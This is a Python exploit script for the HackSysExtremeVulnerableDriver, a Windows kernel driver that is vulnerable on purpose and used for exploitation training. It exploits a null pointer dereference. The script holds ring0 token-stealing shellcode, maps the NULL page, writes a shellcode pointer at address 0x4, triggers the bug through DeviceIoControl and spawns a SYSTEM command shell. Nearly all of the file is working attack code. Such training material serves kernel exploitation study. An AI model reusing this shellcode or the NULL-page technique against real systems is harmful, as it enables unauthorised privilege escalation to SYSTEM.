#************************************************************
#null_pointer_dereference.py: Exploit for the Null Pointer Dereference Vulnerability.
#************************************************************
#Written by r0otki7 <https://github.com/r0otki7/>
#************************************************************
#Website: https://rootkits.xyz
#************************************************************

import ctypes, sys, struct
from ctypes import *
from subprocess import *
 
def logo():
	print """
		_ \        |    |    _) ___  | 
	   __| |   |  _ \  __|  |  /  |     /  
	  |    |   | (   | |      <   |    /   
	 _|   \___/ \___/ \__| _|\_\ _|  _/    
										   
	"""
def main():
    logo()
    kernel32 = windll.kernel32
    psapi = windll.Psapi
    ntdll = windll.ntdll
    hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)
 
    if not hevDevice or hevDevice == -1:
        print "*** Couldn't get Device Driver handle"
        sys.exit(-1)

    #Defining the ring0 shellcode and loading it in VirtualAlloc.
    shellcode = bytearray(
        "\x90\x90\x90\x90"              # NOP Sled
        "\x60"                          # pushad
        "\x64\xA1\x24\x01\x00\x00"      # mov eax, fs:[KTHREAD_OFFSET]
        "\x8B\x40\x50"                  # mov eax, [eax + EPROCESS_OFFSET]
        "\x89\xC1"                      # mov ecx, eax (Current _EPROCESS structure)
        "\x8B\x98\xF8\x00\x00\x00"      # mov ebx, [eax + TOKEN_OFFSET]
        "\xBA\x04\x00\x00\x00"          # mov edx, 4 (SYSTEM PID)
        "\x8B\x80\xB8\x00\x00\x00"      # mov eax, [eax + FLINK_OFFSET]
        "\x2D\xB8\x00\x00\x00"          # sub eax, FLINK_OFFSET
        "\x39\x90\xB4\x00\x00\x00"      # cmp [eax + PID_OFFSET], edx
        "\x75\xED"                      # jnz
        "\x8B\x90\xF8\x00\x00\x00"      # mov edx, [eax + TOKEN_OFFSET]
        "\x89\x91\xF8\x00\x00\x00"      # mov [ecx + TOKEN_OFFSET], edx
        "\x61"                          # popad
        "\xC3"                          # ret
    )

    ptr = kernel32.VirtualAlloc(c_int(0), c_int(len(shellcode)), c_int(0x3000),c_int(0x40))
    buff = (c_char * len(shellcode)).from_buffer(shellcode)
    kernel32.RtlMoveMemory(c_int(ptr), buff, c_int(len(shellcode)))

    print "[+] Pointer for ring0 shellcode: {0}".format(hex(ptr))

    #Allocating the NULL page, Virtual Address Space: 0x0000 - 0x1000.
    #The base address is given as 0x1, which will be rounded down to the next host.
    #We'd be allocating the memory of Size 0x100 (256).

    print "\n[+] Allocating/Mapping NULL page..."

    null_status = ntdll.NtAllocateVirtualMemory(0xFFFFFFFF, byref(c_void_p(0x1)), 0, byref(c_ulong(0x100)), 0x3000, 0x40)
    if null_status != 0x0:
            print "\t[+] Failed to allocate NULL page..."
            sys.exit(-1)
    else:
            print "\t[+] NULL Page Allocated"

    #Writing the ring0 pointer into the desired location in the mapped NULL page, so as to call the pointer @ 0x4.

    print "\n[+] Writing ring0 pointer {0} in location 0x4...".format(hex(ptr))
    if not kernel32.WriteProcessMemory(0xFFFFFFFF, 0x4, byref(c_void_p(ptr)), 0x40, byref(c_ulong())):
            print "\t[+] Failed to write at 0x4 location"
            sys.exit(-1)
 
    buf = '\x37\x13\xd3\xba'
    bufLength = len(buf)
 
    kernel32.DeviceIoControl(hevDevice, 0x22202b, buf, bufLength, None, 0, byref(c_ulong()), None)

    print "\n[+] nt authority\system shell incoming"
    Popen("start cmd", shell=True)
 
if __name__ == "__main__":
    main()
